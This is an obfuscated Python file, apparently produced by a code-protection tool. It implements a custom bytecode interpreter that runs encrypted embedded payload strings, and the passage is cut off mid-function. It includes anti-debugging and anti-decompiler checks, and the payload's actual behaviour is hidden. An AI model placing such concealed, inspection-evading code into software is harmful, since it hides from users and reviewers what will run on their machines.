import base64 as _b64; import builtins as _builtins; import sys as _sys
import types as _types; import zlib as _zlib; import sys as _sys
import time as _time
_subcxulj = bytes((b ^ 164 for b in b''))
def _p7tcs4cc5o():
 _t0 = getattr(_time, 'perf_counter_ns', getattr(_time, 'monotonic_ns', None))
 _acc = _t0() if _t0 else 0
 for _i in range(6):
  _acc = _acc * 1103515245 + 12345 + _i & 4294967295
 return _acc
def _ziiuc039t():
 if getattr(_sys, 'gettrace', None) and _sys.gettrace() is not None:
  raise RuntimeError()
 for _m in (b'pycdc'.decode(), b'uncompyle6'.decode(), b'decompyle++'.decode(), b'decompyle'.decode(), b'bytecode'.decode(), b'decomp'.decode()):
  if _m in _sys.modules:
   raise RuntimeError()
 _f = getattr(_sys, '_getframe', None)
 if _f:
  try:
   _curr = _f(0)
   if getattr(_curr, 'f_trace', None) is not None:
    raise RuntimeError()
  except Exception:
   pass
 _j = _p7tcs4cc5o()
 if _j < 0:
  raise RuntimeError()
 return 0
_uel8hl88kz = {1: '50{JR$}>%=m}K9740@*NcGc^!er-<Ujjj<0<4*;MT=%{7g1EsKYLHPaEdopZNs}N_iYFu)NN+<fKcGT=ej791G{9|7;sm>uuof2g-8jZPjJewMXD8&j!xG-Fw8sV|e?Y5eS$K8;K0*HqYY_jZN(ujj>lPN6dv}w7oV2`7qjqFGc#2BYo7Ssqd8GryLFY+|?5}X$)KH6Ucg+Ta*VDYk$nO%lX{K)qX{7o_m(shbLg%_?*-F22ix&*zZf@$<hV;5=rkl{S8%p_Pzxs5`c@0XAED~Cu7;mRm$`ybt1IQDY3zTIw528G#9|8Ek|MJdr=tqc&qQ>(N#np9|o^BG12K<b_4~zAAg3L!#09{I4&Fy*XYf(el-cILhtpj9~^az!}IzQRopX$Bb^@fh`OS>cB8s<hm*Alx=o8?ipAuFta6Q6ViDHzJjMN(D{hc7Xps5oXSBXPcyW*zA?T!AbmxRUOoK~bhh+tx-3?)a)F!AG}CLZ}q<j}>UM9=%}OBb%XVv1|(XhbJk;!QExm6_+W}S_%*wN%v*EtG09LDt6MpA%KY_59%7k^b5yzl`ojTi{trGTz8mVA=cZetp4HUJfQJh--eGa#QN8)Pv4$1@`0;!$vx>$5^mXxCM@wVitCu-ap+yNy2OmAlpA-d=)7y@DIm?hD>gDJQ4A{oq}F%9;j|V46<BHbC0=fEc$oRxOO(qF3EfZ^T6|oXj3Wd1`Ria>-}9kjGvEva{c->)GJ^yy5S;$;btsuYrjg#`0n~${Kc^b49e+1exy$+`H6}uyo@zU0<7(6>R)_kDUgu`tEdWb^OU^ODR!YdsVOtVQh1b3A8&;{7wNcDmc79#|0KCfKq1s0E?7^~I|Lh_3N=GIHFxatUr~^w7XFoaECHu!cJ8w@kyuVN=L~Pxn)`MOCcxH!j7FT#hg7@ZRCPn2zMvd+}Qg25_GkW<@yeG#i_b%}LVUS|pz>vdiY216!J4Nq<Jpg%4+zg)ZUL#T}QmA{VEEa*i4Q%oJ($SR+Y5Cyh;L_W9Or`N~K~rY;5oJhU%jKo0>dOHS#8W-8k@1%Mz&xOX6m8~C;3|{szQHxU%zJfbBeCHaR0ke`6EBv&bvl{j)~9|^s@KMLsqO1qcLi3(`(jw_tTO?bW64;ATLSF~<P(A9GpI9}sI+ZdK}MWRLLK`nJ}5Q=Q3q$f2TfGvsu1WE9^E~7H8X6Cy^=Qn(0(<DLkGS}B1HdV#7@@5AWG@kOjK2i#2lGR^L~%WPPxP#{k1;S5F@t27B)&t)4fMiI1AcLRa+TVUNmMCtBK@)fQ!(cZ)C(ZXcPV_f^!MaS=026HGU`f(RtXE;PcplMUL}|DEzAQwtM=X%dkeXk3f@QNO2utK(sf0V@IqFd&DacY?vxn-7l!oqb1>pqyyA>oz`%E#0K9Sts1}8w-D}qb%e@ne%JO<?<1Lw6D|I;1&ohN$HGf7=DZLgAqg~n)_uG*@7~u}4~|N!@05aSL%LnzR$vx5sn{4IO}*gQCO!^Od=YI|Ob@mR|I{}+Ke^=MA?I+4=;zednLc66csSg|6NVNF2VkWl=Zo0ubXfcC(bD#RBL_cKuv+xvM`qzt!wyioEW#4e75q#>^5C+0chXMLPgvbam`q<kFS)}_)cUx0Uw0iofg|X)8c!EY1AK0d<1AH}H#;t^5@g<hDz@^A9C6t-FyzSp4^=Z&8|zQAbgZ9#GZ9T1JS``|=pG8HI`8@StX3H`G8CTqs}KK2Ov#~n9mq99M{_LG)g#V*V~iU3Cvp@1M0_Bevym2JS4FAKncdL1lTb{~fDR5eah9O|n$NrB{HynK8SJ23d9qh;FE5od6z', 3286: 'EZ7haFK>4ZW!7-zjssEHu8vP`tTX', 0: '<$k<3=LY5B0zg!NP5-*`-7SPw)s2D;HEsDjEZZYO9hx^rZ1b2%h%0(?=b!vfDpti{4jpQp+)D~(i#kj;M=a2i4a&i;NxgZx6mxa;eFsbLIJX?xasDt)1PU<DjN%B^l%-^dy^Czw<<TvgQy>^s6$D~S_*Q6rn>cpFxvwU#@@8b=QzoJmCcN@c*C=db&kr^k+h!VA5Yr*;3`JS$', 2519: 'F}JXX7VAI3D3-ZmBNud(D0ef$j_A5my|rtIBv*Y??81t0rW|z;', 3: 'imhj;0#!a4D9Rvu~Wx2s^UN=;dF+Wru%KS=v7TD<g+$`r0f4YuTl_f*f^+59{In@(Q0>FnOdd6nCBX8;H2bUA8kBO&EG|;O{{pidZYS^nS*Td)yl)R;>a(e*oN)sWgKU!tKHCRN?+LJB)W$R$Glh_2cXFqVUQ}1(m8!?5Z;$Fazy{Ydoe2A0gnyNOCtM&q+fJe^+{!O=^>vwk%zt5vrL#P1d*VY}t9Pc<;^^4a~AAE0$IR4jHOj0T0=7TWit`J8TOt&$)6Ua9TH-<07r<D@$^ylE<#F)h~3S;6}cB602KtW>GofT3#hqb(mV5Ie;;rAqP-V#Mmjgph;8p|<FmTdWKX<hD|T@I^ZH>8IrFy_?WMWI_z<5){lIjI>{oY{R}HI`x~r(K17t=oM49QjBj8^;qr5Ha~zIA*>3C+4@RXHKRGX?x-J(R3f@jkn!zwbDtyl{C-tI##XXOedtdj|x`KRQmppC3?|Iln^M*-^lMi5Z4B4vH+>1OAcFTJ*L0)(8s^!b1P84Y%Hx9yHgp2F#ul>@3}=cSO`H*j?Z%Xf@T)ok@8PG>Pz|{#hs#9*E#s26thRtVxw7l%jd+B;QOXlsP&J)nmX(J{0Y;aM2!uHxsp=2Rl7dnyTc}@A1z@e5jJqL=4tUe@72+krDiz*7rGUGZr`iK0Jo#T&g%?PH$_MN(YJc9c2C?++%EkZi6mRnNKjq^?_3@2<#(>2c?Jqy$to*)Tmr1_r+bklo<7ZgiJ?v#vet{*)Y)x)Dcw2zL3?xx(|23wzmsrYg4`4^NcZ6;(2G_KXopp0jd}<99@lUAClG{tB1xnx1d<&u(*W}Nz+@%4aWW1NT&VgP#J69VEKdMXWX&g*L_5!+Zmonh4*aGz8dc0jRqQT8A#Nh?L$BbO2fT4VuS6j4sT;=$uxVz&`vTZB1?pJJ^7abyLTsWSRAeG9N<~hOI$9~(>E^v01USE82z{tk=Oq)Rx+&b@TTzx&uq9VUiy2U+P1a~eoYN-G0Z;CcJz+Xz?O*Mw5l_LOAW1s66ue;ihFY-7%ejx$cS^kx1{qU7ko!|85W<K$P_BGETkYb6Dsh*<Y0Dm?=oTApEGAl`fVbL+J#jdIaAlK?KpYsXqi4!s_hy6w5=gL|$a24iN;sFJ8YsSL9qfT^tE*l}U;_YS!6p|&2xr@U5igemu77<TO@jUy8iSo1YKvvkoc)PriMKG<h^9y03^za6wpj)hIkf4h!gkt3`m`l_KvYR5!@OVlc&=g^Dq0@^fq`mh$=(ci*t(a+v!H3r9snl?mm3@|zjxM{QlMO7+cP86TXqpf0eVPc=rGDw8hIs%7~?#|wDytx2YLq$#f#J+a)2xvaUKoNCy~NJuk<T|c_wZ^%4~u!z~OeiXza(id>iH{IhR=A*X8z2*~Gg*;&+K@ecaigGF}0mIs6!~I`p6f)a<*N+e=&I+I|~}#Cx>2Ik5Tv=meiD#JwF)i~}bXsXZcUQ=f|wv-Im^Y3+;(<&xJ)Bs@}uCnPw#=?Yrm;WHF*fUS#$RmN9Vgv7Dn)!G<H`5Q8#?mhK_+)GM)^^rp@1<+h54{L-|&u23~WPv#SSuE%qF)^qFqpl{lpDw^JiST;G3}5K3k4|`|3dacG#;+PFC}^=eQ0uL@EXphVnDwKGoPbstI)#8_x590LVMr8rx}=r<^O~=k+kkkAN=O;;SK}wheTcXz6plCj(tCr~UKHNb8PNrtRj~TzcYS{jLg<Mf<rK6MW{zUpSh`T3E@8ggp%oKx&s!f65s^{CTcWR_#%v-d36P`-nsadD7$@(P$Cgk^T+XZHvzdWuL7Vm2(YSR@>YI=fs6R!1rVsi(eik3K&oB(<!X&yCIu{k-vKmxuzpeEqzUrpkr=DOBkJ7~#nushb;%DbsS(>GSLQS-zbsW(v2u|0wco5a{SMIruG+(Wq&XQU{m2ym28i(nm1Fkm2EX)on54qcusglxs7pMAFex1J-l>Wxq0!o@o=2DD0^&fqUG-#xE0Act_?l>-^^la=)fEk0U6;4cr-??FJ;zs7KNdx>C8={Zt$q*`>TxjRzy@Pemz9)SPgqlO8T97%sp4MUmm0!Xel>!iZl<k;rjHUL-5#OiYYRI5`HIUFZxuJ3>0}E=(YVFK4_IEwexGDB!$+L3Wb0Wd*aSVhEzWa{7Vh0wMGw6j&g?RLLOjyL%hYQdJ8IY$&t;BxeNjeYrE8F;TAi_xDX`_oq_a;c0mtQhs^d#<N_s^(*@BQ-j3QJRD3(V|XpzK12>8~L#$hhqH=kgyVWp3yQ0`B5h@Q8ExKZQ-zJZnKJ7ZCK!aA8U', 2: 'xDM(ErU@eYQ2w)fFIt{J~vP(^*?J#46pT8APv{|A=vD3k>>m`sKuX@}60mN6zU55T^lS>KijrT}HOADv0NSLg_%2uR@c-hZfd4A-t#9xyO~=cY^fK9F7o^zVayYRrBf&z6=K_8S|*nAL8Y}lvd(7$ij88ANT0hX}dUK6MSP=WbW<{>qObt=C&s*E4kXDp@mD|QDrSQ_e<klS?|i~nsPrU^;S@w!&I9&ZJ~?Z)IjVDMK?EADmwoF6pq5'}
def _p2lk2n7h9g():
 return ''.join((_uel8hl88kz[i] for i in range(4)))
def _o1ddpusdd():
 _rugnekrc = len(getattr(_vzycwtiqj, '__slots__', ()))
 _nprcjiwvh = len(getattr(_uaji0y6d, '__slots__', ()))
 return (_rugnekrc * 31 + _nprcjiwvh) * 17 + 42 * 13 + 77 & 4294967295
def _rv25ao20():
 _dk8lw2lm = _o1ddpusdd()
 return ((4282804788 ^ _dk8lw2lm ^ 1641594062) + 31719819 ^ 322145640) & 4294967295
def _u2pcn9t8(data, key):
 out = bytearray(len(data)); cur = key
 for i, b in enumerate(data):
  dec = b ^ cur & 255; out[i] = dec
  cur = (cur ^ dec) * 6251629 + 853041955 & 4294967295
 return bytes(out)
class _nbhsahxt(list):
 def __getitem__(self, idx):
  v = super().__getitem__(idx)
  if isinstance(v, list):
   s = bytes((x ^ v[0] for x in v[1])).decode('utf-8'); self[idx] = s; return s
  return v
 def __iter__(self):
  for i in range(len(self)):
   yield self[i]
 def __contains__(self, item):
  for i in range(len(self)):
   if self[i] == item:
    return True
  return False
 def index(self, item, *args):
  for i in range(len(self)):
   if self[i] == item:
    return i
  return super().index(item, *args)
class _uaji0y6d:
 __slots__ = ('d', 'p')
 def __init__(self, d):
  self.d = d; self.p = 0
 def r_u8(self):
  v = self.d[self.p]; self.p += 1; return v
 def r_u16(self):
  p = self.p; v = self.d[p] << 8 | self.d[p + 1]; self.p += 2; return v
 def r_u32(self):
  p = self.p; d = self.d
  v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]; self.p += 4
  return v
 def r_bytes(self, n):
  v = self.d[self.p:self.p + n]; self.p += n; return v
 def r_const(self):
  tag = self.r_u8()
  if tag == 179:
   return None
  elif tag == 44:
   return False
  elif tag == 22:
   return True
  elif tag == 205:
   v = self.r_u32(); return v if v < 2147483648 else v - 4294967296
  elif tag == 86:
   hi = self.r_u32(); lo = self.r_u32(); v = hi << 32 | lo
   return v if v < 9223372036854775808 else v - 18446744073709551616
  elif tag == 78:
   length = self.r_u16()
   return int.from_bytes(self.r_bytes(length), 'big', signed=True)
  elif tag == 73:
   import struct; return struct.unpack('>d', self.r_bytes(8))[0]
  elif tag == 51:
   length = self.r_u32(); return self.r_bytes(length)
  elif tag == 204:
   count = self.r_u16(); items = []
   for _ in range(count):
    c = self.r_const()
    if isinstance(c, list):
     c = bytes((x ^ c[0] for x in c[1])).decode('utf-8')
    items.append(c)
   return tuple(items)
  elif tag == 42:
   length = self.r_u32(); sub_reader = _uaji0y6d(self.r_bytes(length))
   return _hv3a3zmf8(sub_reader)
  elif tag == 189:
   key = self.r_u8(); length = self.r_u32(); return [key, self.r_bytes(length)]
  elif tag == 155:
   length = self.r_u32(); return self.r_bytes(length).decode('utf-8')
  raise ValueError(f'Unknown tag: {tag}')
class _hv3a3zmf8:
 __slots__ = ('name', 'argcount', 'posonlyargcount', 'kwonlyargcount', 'flags', 'varnames', 'cellvars', 'freevars', 'names', 'consts', 'instructions')
 def __init__(self, reader):
  self.flags = reader.r_u16(); varnames_cnt = reader.r_u16()
  self.varnames = _nbhsahxt((reader.r_const() for _ in range(varnames_cnt)))
  self.kwonlyargcount = reader.r_u8(); raw_name = reader.r_const()
  self.name = bytes((x ^ raw_name[0] for x in raw_name[1])).decode('utf-8') if isinstance(raw_name, list) else raw_name
  insn_len = reader.r_u32(); insn_bytes = reader.r_bytes(insn_len)
  self.instructions = {}; pc = 46; pos = 0
  while pos < len(insn_bytes):
   fmt = insn_bytes[pos]
   op = (insn_bytes[pos + 1] << 8 | insn_bytes[pos + 2]) ^ 51021; pos += 3
   if fmt == 147:
    arg = None
   elif fmt == 115:
    arg = insn_bytes[pos]; pos += 1
   elif fmt == 61:
    arg = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; pos += 2
   elif fmt == 122:
    val = insn_bytes[pos] << 24 | insn_bytes[pos + 1] << 16 | insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
    arg = val if val < 2147483648 else val - 4294967296; pos += 4
   elif fmt == 159:
    a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]
    b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]; arg = (a, b); pos += 4
   elif fmt == 77:
    a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]
    b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
    c = insn_bytes[pos + 4] << 8 | insn_bytes[pos + 5]; arg = (a, b, c)
    pos += 6
   self.instructions[pc] = (op, arg); pc += 3
  for _st75pb8z3, _t6dixfwuxx, _y8pajssuu in [(71, 1320, None), (54, 4149, None), (65, 2346, None), (66, 908, 33), (71, 468, 2), (78, 1809, 1)]:
   self.instructions[_st75pb8z3] = (_t6dixfwuxx, _y8pajssuu)
  names_cnt = reader.r_u16()
  self.names = _nbhsahxt((reader.r_const() for _ in range(names_cnt)))
  freevars_cnt = reader.r_u16()
  self.freevars = _nbhsahxt((reader.r_const() for _ in range(freevars_cnt)))
  self.argcount = reader.r_u8(); cellvars_cnt = reader.r_u16()
  self.cellvars = _nbhsahxt((reader.r_const() for _ in range(cellvars_cnt)))
  consts_cnt = reader.r_u16()
  self.consts = _nbhsahxt((reader.r_const() for _ in range(consts_cnt)))
  self.posonlyargcount = reader.r_u8()
class _kdd4v30t:
 EXCEPT = 1; FINALLY = 2; WITH = 3
class _mt3w5uzb:
 __slots__ = ('type', 'handler_pc', 'stack_height', 'exit_fn')
 def __init__(self, type, handler_pc, stack_height, exit_fn=None):
  self.type = type; self.handler_pc = handler_pc
  self.stack_height = stack_height; self.exit_fn = exit_fn
def _azytjxepq8(code, args, kwargs, defaults=(), kw_defaults=None):
 kw_defaults = kw_defaults or {}; total_vars = len(code.varnames)
 fastlocals = [None] * total_vars; posonly = code.posonlyargcount
 total_pos = code.argcount; kwonly = code.kwonlyargcount
 has_varargs = bool(code.flags & 4); has_varkw = bool(code.flags & 8)
 n_args = len(args)
 if n_args > total_pos:
  if not has_varargs:
   raise TypeError(f"{code.name}() takes {total_pos} positional argument{('s' if total_pos != 1 else '')} but {n_args} were given")
  for i in range(total_pos):
   fastlocals[i] = args[i]
  vararg_idx = total_pos + kwonly
  fastlocals[vararg_idx] = tuple(args[total_pos:])
 else:
  for i in range(n_args):
   fastlocals[i] = args[i]
  if has_varargs:
   vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = ()
 if n_args < total_pos:
  n_defaults = len(defaults); def_start = total_pos - n_defaults
  for i in range(n_args, total_pos):
   def_idx = i - def_start
   if 0 <= def_idx < n_defaults:
    fastlocals[i] = defaults[def_idx]
 remaining_kwargs = dict(kwargs)
 for i in range(posonly):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   raise TypeError(f"{code.name}() got some positional-only arguments passed as keyword arguments: '{p_name}'")
 for i in range(posonly, total_pos):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   if i < n_args:
    raise TypeError(f"{code.name}() got multiple values for argument '{p_name}'")
   fastlocals[i] = remaining_kwargs.pop(p_name)
  elif i >= n_args:
   n_defaults = len(defaults); def_start = total_pos - n_defaults
   def_idx = i - def_start
   if not 0 <= def_idx < n_defaults:
    raise TypeError(f"{code.name}() missing required positional argument: '{p_name}'")
 for i in range(n_args, posonly):
  n_defaults = len(defaults); def_start = total_pos - n_defaults
  def_idx = i - def_start
  if not 0 <= def_idx < n_defaults:
   raise TypeError(f"{code.name}() missing required positional argument: '{code.varnames[i]}'")
 for i in range(total_pos, total_pos + kwonly):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   fastlocals[i] = remaining_kwargs.pop(p_name)
  elif p_name in kw_defaults:
   fastlocals[i] = kw_defaults[p_name]
  else:
   raise TypeError(f"{code.name}() missing required keyword-only argument: '{p_name}'")
 if has_varkw:
  kwarg_idx = total_pos + kwonly + (1 if has_varargs else 0)
  fastlocals[kwarg_idx] = remaining_kwargs
 elif remaining_kwargs:
  unexpected = next(iter(remaining_kwargs))
  raise TypeError(f"{code.name}() got an unexpected keyword argument '{unexpected}'")
 return fastlocals
class _s6oh9sdbd:
 __slots__ = ('m', 'b', 'l')
 def __init__(self, m, b, l):
  self.m = m; self.b = b; self.l = l
 def __getitem__(self, i):
  if isinstance(i, slice):
   start, stop, step = i.indices(self.l)
   return [self.m[self.b + x] for x in range(start, stop, step)]
  if i < 0:
   i += self.l
  if not 0 <= i < self.l:
   raise IndexError('list index out of range')
  return self.m[self.b + i]
 def __setitem__(self, i, v):
  if isinstance(i, slice):
   start, stop, step = i.indices(self.l)
   indices = list(range(start, stop, step)); v_list = list(v)
   if step == 1:
    delta = len(v_list) - len(indices)
    if delta > 0:
     for k in range(self.l - 1, stop - 1, -1):
      self.m[self.b + k + delta] = self.m[self.b + k]
    elif delta < 0:
     for k in range(stop, self.l):
      self.m[self.b + k + delta] = self.m[self.b + k]
     for k in range(self.l + delta, self.l):
      self.m[self.b + k] = None
    for idx_k, item in enumerate(v_list):
     self.m[self.b + start + idx_k] = item
    self.l += delta
   else:
    if len(indices) != len(v_list):
     raise ValueError('attempt to assign sequence to extended slice of different size')
    for idx_k, item in zip(indices, v_list):
     self.m[self.b + idx_k] = item
   return
  if i < 0:
   i += self.l
  if not 0 <= i < self.l:
   raise IndexError('list assignment index out of range')
  self.m[self.b + i] = v
 def __len__(self):
  return self.l
 def __bool__(self):
  return self.l > 0
 def __iter__(self):
  for i in range(self.l):
   yield self.m[self.b + i]
 def append(self, v):
  self.m[self.b + self.l] = v; self.l += 1
 def extend(self, it):
  for x in it:
   self.append(x)
 def index(self, item, *args):
  for i in range(self.l):
   if self.m[self.b + i] == item:
    return i
  raise ValueError(str(item) + ' is not in list')
 def __contains__(self, item):
  for i in range(self.l):
   if self.m[self.b + i] == item:
    return True
  return False
class _slxo6qjiuj:
 __slots__ = ('m', 'b', 'd', 'p')
 def __init__(self, m, b, d):
  self.m = m; self.b = b; self.d = d; self.p = b
 def __len__(self):
  return (self.p - self.b) * self.d
 def __bool__(self):
  return self.p != self.b
 def append(self, v):
  self.m[self.p] = v; self.p += self.d
 def extend(self, it):
  for x in it:
   self.append(x)
 def __iadd__(self, it):
  for x in it:
   self.append(x)
  return self
 def pop(self, i=-1):
  L = self.__len__()
  if L == 0:
   raise IndexError('pop from empty list')
  if i == -1 or i == L - 1:
   self.p -= self.d; v = self.m[self.p]; self.m[self.p] = None; return v
  if i < 0:
   i += L
  if not 0 <= i < L:
   raise IndexError('pop index out of range')
  v = self.m[self.b + i * self.d]
  for k in range(i, L - 1):
   self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
  self.p -= self.d; self.m[self.p] = None; return v
 def insert(self, i, v):
  L = self.__len__()
  if i < 0:
   i += L
  if i < 0:
   i = 0
  if i > L:
   i = L
  for k in range(L, i, -1):
   self.m[self.b + k * self.d] = self.m[self.b + (k - 1) * self.d]
  self.m[self.b + i * self.d] = v; self.p += self.d
 def __getitem__(self, i):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L)
   return [self.m[self.b + x * self.d] for x in range(start, stop, step)]
  if i < 0:
   i += L
  if not 0 <= i < L:
   raise IndexError('list index out of range')
  return self.m[self.b + i * self.d]
 def __setitem__(self, i, v):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L); indices = list(range(start, stop, step))
   v_list = list(v)
   if step == 1:
    delta = len(v_list) - len(indices)
    if delta > 0:
     for k in range(L - 1, stop - 1, -1):
      self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
    elif delta < 0:
     for k in range(stop, L):
      self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
     for k in range(L + delta, L):
      self.m[self.b + k * self.d] = None
    for idx_k, item in enumerate(v_list):
     self.m[self.b + (start + idx_k) * self.d] = item
    self.p += delta * self.d
   else:
    if len(indices) != len(v_list):
     raise ValueError('attempt to assign sequence to extended slice of different size')
    for idx_k, item in zip(indices, v_list):
     self.m[self.b + idx_k * self.d] = item
   return
  if i < 0:
   i += L
  if not 0 <= i < L:
   raise IndexError('list assignment index out of range')
  self.m[self.b + i * self.d] = v
 def __delitem__(self, i):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L)
   if step == 1:
    to_remove = max(0, stop - start)
    if to_remove > 0:
     for k in range(stop, L):
      self.m[self.b + (k - to_remove) * self.d] = self.m[self.b + k * self.d]
     for k in range(L - to_remove, L):
      self.m[self.b + k * self.d] = None
     self.p -= to_remove * self.d
   else:
    indices = sorted(list(range(start, stop, step))); to_del = set(indices)
    new_items = [self.m[self.b + x * self.d] for x in range(L) if x not in to_del]
    for x, val in enumerate(new_items):
     self.m[self.b + x * self.d] = val
    for x in range(len(new_items), L):
     self.m[self.b + x * self.d] = None
    self.p = self.b + len(new_items) * self.d
   return
  if i < 0:
   i += L
  if not 0 <= i < L:
   raise IndexError('list assignment index out of range')
  for k in range(i, L - 1):
   self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
  self.p -= self.d; self.m[self.p] = None
 def __iter__(self):
  for i in range(self.__len__()):
   yield self.m[self.b + i * self.d]
 def clear(self):
  L = self.__len__()
  for i in range(L):
   self.m[self.b + i * self.d] = None
  self.p = self.b
 def copy(self):
  return [self.m[self.b + i * self.d] for i in range(self.__len__())]
class _h945nq4fm:
 __slots__ = ('val',)
 def __init__(self, val=None):
  self.val = val
class _vzycwtiqj:
 __slots__ = ('_vncxll4z', '_zj2d54i3', '_f4zw9xa3k', '_schj755n', '_el6246hi', '_sjza7tz0', '_jlookep7y6', '_ia1wj0tp', '_ac56t4uf', '_v7eedtjv', '_ok2iagl58', '_whwjr64dp', '_vljexq77aw', '_idp0lvsn', '_d25owf759', '_ixo9t7e8g', '_z5a0l725')
 def __init__(self, code, globals_dict, locals_dict=None, fastlocals=None, closure=None, func=None):
  self._vljexq77aw = code; self._schj755n = globals_dict
  self._f4zw9xa3k = locals_dict if locals_dict is not None else globals_dict
  self._whwjr64dp = closure or (); self._zj2d54i3 = func
  self._idp0lvsn = [None] * 4096
  self._v7eedtjv = _s6oh9sdbd(self._idp0lvsn, 0, len(code.varnames))
  if fastlocals is not None:
   for i, v in enumerate(fastlocals):
    self._v7eedtjv[i] = v
  self._ok2iagl58 = _s6oh9sdbd(self._idp0lvsn, 128, 256)
  self._ac56t4uf = _slxo6qjiuj(self._idp0lvsn, 384, 1); self._ia1wj0tp = []
  for var in code.cellvars:
   init_val = None
   if var in code.varnames:
    v_idx = code.varnames.index(var)
    if v_idx < len(self._v7eedtjv):
     init_val = self._v7eedtjv[v_idx]
   self._ia1wj0tp.append(_h945nq4fm(init_val))
  if closure:
   self._ia1wj0tp.extend(closure)
  self._el6246hi = []; self._d25owf759 = None; self._z5a0l725 = 46
  self._ixo9t7e8g = None; self._sjza7tz0 = None; self._vncxll4z = []
  self._jlookep7y6 = 0
class _uuy41ibljh:
 def __init__(self, code, globals_dict, defaults=(), kw_defaults=None, closure=None):
  self.code = code; self.globals_dict = globals_dict; self.defaults = defaults
  self.kw_defaults = kw_defaults or {}; self.closure = closure or ()
  self._xxrghc0clb = True; self.__name__ = code.name
  self.__qualname__ = code.name; self.__doc__ = None
  self.__defaults__ = defaults if defaults else None
  self.__kwdefaults__ = kw_defaults if kw_defaults else None
  self.__closure__ = closure; self.__code__ = code
  self.__module__ = globals_dict.get('__name__', '__main__')
 def __get__(self, instance, owner=None):
  if instance is None:
   return self
  return _types.MethodType(self, instance)
 def execute_with_locals(self, locals_dict):
  f = _vzycwtiqj(self.code, self.globals_dict, locals_dict=locals_dict, closure=self.closure, func=self)
  return _x81sdw4sh(f)
 def __call__(self, *args, **kwargs):
  fastlocals = _azytjxepq8(self.code, args, kwargs, self.defaults, self.kw_defaults)
  f = _vzycwtiqj(self.code, self.globals_dict, fastlocals=fastlocals, closure=self.closure, func=self)
  return _x81sdw4sh(f)
def _zgdswm31yi(left, right, cmp_arg):
 if cmp_arg == 0:
  return left < right
 elif cmp_arg == 1:
  return left <= right
 elif cmp_arg == 2:
  return left == right
 elif cmp_arg == 3:
  return left != right
 elif cmp_arg == 4:
  return left > right
 elif cmp_arg == 5:
  return left >= right
 elif cmp_arg == 6:
  return left in right
 elif cmp_arg == 7:
  return left not in right
 elif cmp_arg == 8:
  return left is right
 elif cmp_arg == 9:
  return left is not right
 elif cmp_arg == 10:
  return isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
 return False
def _gair4cow(pairs):
 d = {}
 for i in range(0, len(pairs), 2):
  d[pairs[i]] = pairs[i + 1]
 return d
def _gzrixa11dp(name, globals_dict, builtins_dict, frame):
 if name in globals_dict:
  return globals_dict[name]
 elif name == 'super':
  def _vm_super(*args):
   if not args:
    if hasattr(frame, 'func') and frame.func and hasattr(frame.func, '__class_owner__') and frame.fastlocals:
     return _builtins.super(frame.func.__class_owner__, frame.fastlocals[0])
   return _builtins.super(*args)
  return _vm_super
 elif builtins_dict and name in builtins_dict:
  return builtins_dict[name]
 raise NameError(f"name '{name}' is not defined")
_RET_SIGNAL = object()
def _xla3c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 globals_dict[names[arg]] = stack.pop()
def _xo590(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d, _b, _c = arg; _m = {}
 for i in range(_c):
  _m[registers[_b + 2 * i]] = registers[_b + 2 * i + 1]
 registers[_d] = _m
def _xb920(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_v = fastlocals[2]; registers[1] = _b_0_v; _b_1_c = consts[3]
 registers[2] = _b_1_c; _b_2_c = consts[4]; registers[3] = _b_2_c
def _xbae8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 locals_dict[names[arg[0]]] = registers[arg[1]]
def _xh11d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[5]; registers[4] = _b_0_c; _b_1_c = consts[6]
 registers[5] = _b_1_c; _b_2_c = consts[7]; registers[6] = _b_2_c
 _b_3_c = consts[8]; registers[7] = _b_3_c
def _xnf5d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 def _vfkjfpnqv(func, name, *bases, **kwds):
  meta = kwds.get('metaclass')
  if meta is None:
   meta = type(bases[0]) if bases else type
  ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
  if hasattr(func, 'execute_with_locals'):
   func.execute_with_locals(ns)
  elif callable(func):
   func()
  cls = meta(name, bases, ns, **kwds)
  for item in ns.values():
   if hasattr(item, '__code__') or hasattr(item, '__class_owner__'):
    item.__class_owner__ = cls
  return cls
 registers[arg] = _vfkjfpnqv
def _xq4ce(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 val = stack.pop(); key = stack.pop()
 depth = arg if arg is not None and arg > 0 else 1; stack[-depth][key] = val
def _xx9ac(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[22]; registers[3] = _b_0_c; _b_1_c = consts[17]
 registers[4] = _b_1_c; _b_2_c = consts[23]; registers[5] = _b_2_c
def _xy1c0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d, _cr, _fl = arg; _co = registers[_cr]; _cl = []
 if _co.freevars:
  for _v in _co.freevars:
   if _v in frame._vljexq77aw.cellvars:
    _cl.append(frame._ia1wj0tp[frame._vljexq77aw.cellvars.index(_v)])
